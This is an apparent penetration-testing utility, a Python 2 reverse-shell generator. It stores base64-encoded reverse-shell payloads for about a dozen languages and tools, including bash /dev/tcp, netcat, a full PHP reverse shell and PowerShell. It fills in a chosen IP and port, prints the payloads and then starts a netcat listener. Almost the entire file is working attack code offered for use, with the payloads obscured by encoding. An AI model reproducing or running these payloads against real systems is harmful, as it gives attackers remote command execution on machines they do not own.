# !/usr/bin/python
# coding=utf-8
import requests,sys,base64,os
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Variable

LIST_SHELL = {
	"python" : ["aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgb3MKCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIlJFUExBQ0VfSVAiLFJFUExBQ0VfUE9SVCkpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnA9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pCg==","cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiUkVQTEFDRV9JUCIsUkVQTEFDRV9QT1JUKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsnCg==","cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiUkVQTEFDRV9JUCIsUkVQTEFDRV9QT1JUKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiL2Jpbi9iYXNoIiknCg=="],
	"python3" : ["aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgb3MKCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIlJFUExBQ0VfSVAiLFJFUExBQ0VfUE9SVCkpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnA9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pCg==","cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIlJFUExBQ0VfSVAiLFJFUExBQ0VfUE9SVCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7Jwo=="],
	"bash" : ["YmFzaCAtaSA+JiAvZGV2L3RjcC9SRVBMQUNFX0lQL1JFUExBQ0VfUE9SVCAwPiYxCg=="],
	"nc" : ["bmMgLWUgL2Jpbi9zaCBSRVBMQUNFX0lQIFJFUExBQ0VfUE9SVAo=","bmMgUkVQTEFDRV9JUCBSRVBMQUNFX1BPUlQgLWUgYmFzaAo=","cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZiB8IC9iaW4vc2ggLWkgMj4mMSB8IG5jIFJFUExBQ0VfSVAgUkVQTEFDRV9QT1JUID4vdG1wL2YK"],
	"php" : ["PD9waHAKc2V0X3RpbWVfbGltaXQgKDApOwokVkVSU0lPTiA9ICIxLjAiOwokaXAgPSAnUkVQTEFDRV9JUCc7ICAKJHBvcnQgPSBSRVBMQUNFX1BPUlQ7ICAgICAgIAokY2h1bmtfc2l6ZSA9IDE0MDA7CiR3cml0ZV9hID0gbnVsbDsKJGVycm9yX2EgPSBudWxsOwokc2hlbGwgPSAndW5hbWUgLWE7IHc7IGlkOyAvYmluL3NoIC1pJzsKJGRhZW1vbiA9IDA7CiRkZWJ1ZyA9IDA7CmlmIChmdW5jdGlvbl9leGlzdHMoJ3BjbnRsX2ZvcmsnKSkgewogICAgICAgIC8vIEZvcmsgYW5kIGhhdmUgdGhlIHBhcmVudCBwcm9jZXNzIGV4aXQKICAgICAgICAkcGlkID0gcGNudGxfZm9yaygpOwogICAgICAgIGlmICgkcGlkID09IC0xKSB7CiAgICAgICAgICAgICAgICBwcmludGl0KCJFUlJPUjogQ2FuJ3QgZm9yayIpOwogICAgICAgICAgICAgICAgZXhpdCgxKTsKICAgICAgICB9CiAgICAgICAgaWYgKCRwaWQpIHsKICAgICAgICAgICAgICAgIGV4aXQoMCk7ICAvLyBQYXJlbnQgZXhpdHMKICAgICAgICB9CiAgICAgICAgaWYgKHBvc2l4X3NldHNpZCgpID09IC0xKSB7CiAgICAgICAgICAgICAgICBwcmludGl0KCJFcnJvcjogQ2FuJ3Qgc2V0c2lkKCkiKTsKICAgICAgICAgICAgICAgIGV4aXQoMSk7CiAgICAgICAgfQogICAgICAgICRkYWVtb24gPSAxOwp9IGVsc2UgewogICAgICAgIHByaW50aXQoIldBUk5JTkc6IEZhaWxlZCB0byBkYWVtb25pc2UuICBUaGlzIGlzIHF1aXRlIGNvbW1vbiBhbmQgbm90IGZhdGFsLiIpOwp9CmNoZGlyKCIvIik7CnVtYXNrKDApOwokc29jayA9IGZzb2Nrb3BlbigkaXAsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsIDMwKTsKaWYgKCEkc29jaykgewogICAgICAgIHByaW50aXQoIiRlcnJzdHIgKCRlcnJubykiKTsKICAgICAgICBleGl0KDEpOwp9CiRkZXNjcmlwdG9yc3BlYyA9IGFycmF5KAogICAwID0+IGFycmF5KCJwaXBlIiwgInIiKSwgIC8vIHN0ZGluIGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHJlYWQgZnJvbQogICAxID0+IGFycmF5KCJwaXBlIiwgInciKSwgIC8vIHN0ZG91dCBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCB3cml0ZSB0bwogICAyID0+IGFycmF5KCJwaXBlIiwgInciKSAgIC8vIHN0ZGVyciBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCB3cml0ZSB0bwopOwokcHJvY2VzcyA9IHByb2Nfb3Blbigkc2hlbGwsICRkZXNjcmlwdG9yc3BlYywgJHBpcGVzKTsKaWYgKCFpc19yZXNvdXJjZSgkcHJvY2VzcykpIHsKICAgICAgICBwcmludGl0KCJFUlJPUjogQ2FuJ3Qgc3Bhd24gc2hlbGwiKTsKICAgICAgICBleGl0KDEpOwp9CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzBdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMV0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1syXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssIDApOwpwcmludGl0KCJTdWNjZXNzZnVsbHkgb3BlbmVkIHJldmVyc2Ugc2hlbGwgdG8gJGlwOiRwb3J0Iik7CndoaWxlICgxKSB7CiAgICAgICAgaWYgKGZlb2YoJHNvY2spKSB7CiAgICAgICAgICAgICAgICBwcmludGl0KCJFUlJPUjogU2hlbGwgY29ubmVjdGlvbiB0ZXJtaW5hdGVkIik7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgaWYgKGZlb2YoJHBpcGVzWzFdKSkgewogICAgICAgICAgICAgICAgcHJpbnRpdCgiRVJST1I6IFNoZWxsIHByb2Nlc3MgdGVybWluYXRlZCIpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgICAgICRyZWFkX2EgPSBhcnJheSgkc29jaywgJHBpcGVzWzFdLCAkcGlwZXNbMl0pOwogICAgICAgICRudW1fY2hhbmdlZF9zb2NrZXRzID0gc3RyZWFtX3NlbGVjdCgkcmVhZF9hLCAkd3JpdGVfYSwgJGVycm9yX2EsIG51bGwpOwogICAgICAgIGlmIChpbl9hcnJheSgkc29jaywgJHJlYWRfYSkpIHsKICAgICAgICAgICAgICAgIGlmICgkZGVidWcpIHByaW50aXQoIlNPQ0sgUkVBRCIpOwogICAgICAgICAgICAgICAgJGlucHV0ID0gZnJlYWQoJHNvY2ssICRjaHVua19zaXplKTsKICAgICAgICAgICAgICAgIGlmICgkZGVidWcpIHByaW50aXQoIlNPQ0s6ICRpbnB1dCIpOwogICAgICAgICAgICAgICAgZndyaXRlKCRwaXBlc1swXSwgJGlucHV0KTsKICAgICAgICB9CiAgICAgICAgaWYgKGluX2FycmF5KCRwaXBlc1sxXSwgJHJlYWRfYSkpIHsKICAgICAgICAgICAgICAgIGlmICgkZGVidWcpIHByaW50aXQoIlNURE9VVCBSRUFEIik7CiAgICAgICAgICAgICAgICAkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTsKICAgICAgICAgICAgICAgIGlmICgkZGVidWcpIHByaW50aXQoIlNURE9VVDogJGlucHV0Iik7CiAgICAgICAgICAgICAgICBmd3JpdGUoJHNvY2ssICRpbnB1dCk7CiAgICAgICAgfQogICAgICAgIGlmIChpbl9hcnJheSgkcGlwZXNbMl0sICRyZWFkX2EpKSB7CiAgICAgICAgICAgICAgICBpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlIgUkVBRCIpOwogICAgICAgICAgICAgICAgJGlucHV0ID0gZnJlYWQoJHBpcGVzWzJdLCAkY2h1bmtfc2l6ZSk7CiAgICAgICAgICAgICAgICBpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlI6ICRpbnB1dCIpOwogICAgICAgICAgICAgICAgZndyaXRlKCRzb2NrLCAkaW5wdXQpOwogICAgICAgIH0KfQpmY2xvc2UoJHNvY2spOwpmY2xvc2UoJHBpcGVzWzBdKTsKZmNsb3NlKCRwaXBlc1sxXSk7CmZjbG9zZSgkcGlwZXNbMl0pOwpwcm9jX2Nsb3NlKCRwcm9jZXNzKTsKZnVuY3Rpb24gcHJpbnRpdCAoJHN0cmluZykgewogICAgICAgIGlmICghJGRhZW1vbikgewogICAgICAgICAgICAgICAgcHJpbnQgIiRzdHJpbmdcbiI7CiAgICAgICAgfQp9Cj8+Cg==","PD9waHAKICAgIHN5c3RlbSgncm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgUkVQTEFDRV9JUCBSRVBMQUNFX1BPUlQgPi90bXAvZicpOwo/Pgo=","PD9waHAKICAgIGV4ZWMoIi9iaW4vYmFzaCAtYyAnYmFzaCAtaSA+IC9kZXYvdGNwL1JFUExBQ0VfSVAvUkVQTEFDRV9QT1JUIDA+JjEnIik7Cj8+Cg=="],
	"perl":["cGVybCAtZSAndXNlIFNvY2tldDskaT0iUkVQTEFDRV9JUCI7JHA9UkVQTEFDRV9QT1JUO3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9OycK","dXNlIFNvY2tldAoKJGk9IlJFUExBQ0VfSVAiOwokcD1SRVBMQUNFX1BPUlQ7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpOwppZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXsKICAgIG9wZW4oU1RESU4sIj4mUyIpOwogICAgb3BlbihTVERPVVQsIj4mUyIpOwogICAgb3BlbihTVERFUlIsIj4mUyIpOwogICAgZXhlYygiL2Jpbi9zaCAtaSIpOwp9Cg=="],
	"ruby": ["cnVieSAtcnNvY2tldCAtZSAnZXhpdCBpZiBmb3JrO2M9VENQU29ja2V0Lm5ldygiUkVQTEFDRV9JUCIsUkVQTEFDRV9QT1JUKTt3aGlsZShjbWQ9Yy5nZXRzKTtJTy5wb3BlbihjbWQsInIiKXt8aW98Yy5wcmludCBpby5yZWFkfWVuZCcK","cmVxdWlyZSAnc29ja2V0JwoKYz1UQ1BTb2NrZXQubmV3KCJSRVBMQUNFX0lQIixSRVBMQUNFX1BPUlQpCgp3aGlsZShjbWQ9Yy5nZXRzKQogICAgSU8ucG9wZW4oY21kLCJyIil7CiAgICAgICAgfGlvfGMucHJpbnQgaW8ucmVhZAogICAgfQplbmQK"],
	"haskell" : ["bW9kdWxlIE1haW4gd2hlcmUKCmltcG9ydCBTeXN0ZW0uUHJvY2VzcwoKbWFpbiA9IGNhbGxDb21tYW5kICJybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mIHwgL2Jpbi9zaCAtaSAyPiYxIHwgbmMgUkVQTEFDRV9JUCBSRVBMQUNFX1BPUlQgPi90bXAvZiIK"],
	"powershell" : ["cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCdSRVBMQUNFX0lQJyxSRVBMQUNFX1BPUlQpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCkiCg==","JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgiUkVQTEFDRV9JUCIsUkVQTEFDRV9QT1JUKTskc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKTtbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKCRpID0gJHN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCkpIC1uZSAwKXs7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRieXRlcywwLCAkaSk7JHNlbmRiYWNrID0gKGlleCAkZGF0YSAyPiYxIHwgT3V0LVN0cmluZyApOyRzZW5kYmFjazIgPSAkc2VuZGJhY2sgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiOyRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKX07JGNsaWVudC5DbG9zZSgpCg=="],
	"nodejs" : ["KGZ1bmN0aW9uKCl7CiAgICB2YXIgbmV0ID0gcmVxdWlyZSgibmV0IiksCiAgICAgICAgY3AgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksCiAgICAgICAgc2ggPSBjcC5zcGF3bigiL2Jpbi9zaCIsIFtdKTsKICAgIHZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwogICAgY2xpZW50LmNvbm5lY3QoUkVQTEFDRV9QT1JULCAiUkVQTEFDRV9JUCIsIGZ1bmN0aW9uKCl7CiAgICAgICAgY2xpZW50LnBpcGUoc2guc3RkaW4pOwogICAgICAgIHNoLnN0ZG91dC5waXBlKGNsaWVudCk7CiAgICAgICAgc2guc3RkZXJyLnBpcGUoY2xpZW50KTsKICAgIH0pOwogICAgcmV0dXJuIC9hLzsgLy8gUHJldmVudHMgdGhlIE5vZGUuanMgYXBwbGljYXRpb24gZm9ybSBjcmFzaGluZwp9KSgpOwo=","cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ25jIC1lIC9iaW4vc2ggUkVQTEFDRV9JUCBSRVBMQUNFX1BPUlQnKQo="],
	"awk" : ["YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC9SRVBMQUNFX0lQL1JFUExBQ0VfUE9SVCI7IHdoaWxlKDQyKSB7IGRveyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRsaW5lIGM7IGlmKGMpeyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8JiBzOyBjbG9zZShjKTsgfSB9IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShzKTsgfX0nIC9kZXYvbnVsbAo="],
	"ncat" : ["bmNhdCBSRVBMQUNFX0lQIFJFUExBQ0VfUE9SVCAtZSAvYmluL2Jhc2gK","bmNhdCAtLXVkcCBSRVBMQUNFX0lQIFJFUExBQ0VfUE9SVCAtZSAvYmluL2Jhc2gK"]
}

# Header
def header():
	SIG = headercolor('''
 ______  ______  ______   ______        
| |         / / | |  | \     / /         
| |----  .---'  | |__|_/  .---'     
|_|____ /_/___  |_|      /_/___      
		   ______   _    _   ______  _        _       
		  / |      | |  | | | |     | |      | |      
		  '------. | |--| | | |---- | |   _  | |   _  
		   ____|_/ |_|  |_| |_|____ |_|__|_| |_|__|_| 
                                        [Customize by H0j3n]                   
''')
    	return SIG
    	
# Color Function
def headercolor(STRING):
    return Style.BRIGHT+Fore.GREEN+STRING+Fore.RESET
    
def formatHelp(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET
    

# Main    	
if __name__ == "__main__":
	print header()
	if len(sys.argv) == 1:
		print formatHelp("(+) Usage :\t\t python %s <TYPE> <IP> <PORT>" % sys.argv[0])
		print headercolor("Available Type =>\t python,python3,bash,nc,php,perl,ruby,haskell,\n\t\t\t powershell,nodejs,awk,ncat")
		sys.exit(-1)
	if len(sys.argv) == 2:
		print formatHelp("(+) Usage :\t\t python %s <TYPE> <IP> <PORT>" % sys.argv[0])
		print headercolor("Available Type =>\t python,python3,bash,nc,php,perl,ruby,haskell,\n\t\t\t powershell,nodejs,awk,ncat")
		print formatHelp("\nPlease Specify IP")
		sys.exit(-1)
	if len(sys.argv) == 3:
		print formatHelp("(+) Usage :\t\t python %s <TYPE> <IP> <PORT>" % sys.argv[0])
		print headercolor("Available Type =>\t python,python3,bash,nc,php,perl,ruby,haskell,\n\t\t\t powershell,nodejs,awk,ncat")
		print formatHelp("\nPlease Specify PORT")
		sys.exit(-1)
		
	OPTIONS = sys.argv[1]
	IP = sys.argv[2]
	PORT = sys.argv[3]
	COUNTER = 0
	ONLY_BASH =""
	for i in LIST_SHELL:
		if i == OPTIONS:
			for j in LIST_SHELL[i]:
				print headercolor("[+] Example #" + str(COUNTER+1)+"\n")
				TEMP = base64.b64decode(j).decode('utf-8')
				TEMP2 = TEMP.replace("REPLACE_IP", IP)
				REAL = TEMP2.replace("REPLACE_PORT", PORT)
				print REAL
				if i == "bash" and COUNTER == 0:
					TEMP = 'echo ' + base64.b64encode(REAL) + ' | base64 -d | bash\n'
					LIST_SHELL["bash"].append(base64.b64encode(TEMP))
				COUNTER += 1
	
	print('\033[1m'+'\033[92m'+"[*] "+'\033[0m' +"Starting the listener on "+str(IP)+":"+str(PORT)+"...")
        os.system('nc -lvnp '+ str(PORT))
	
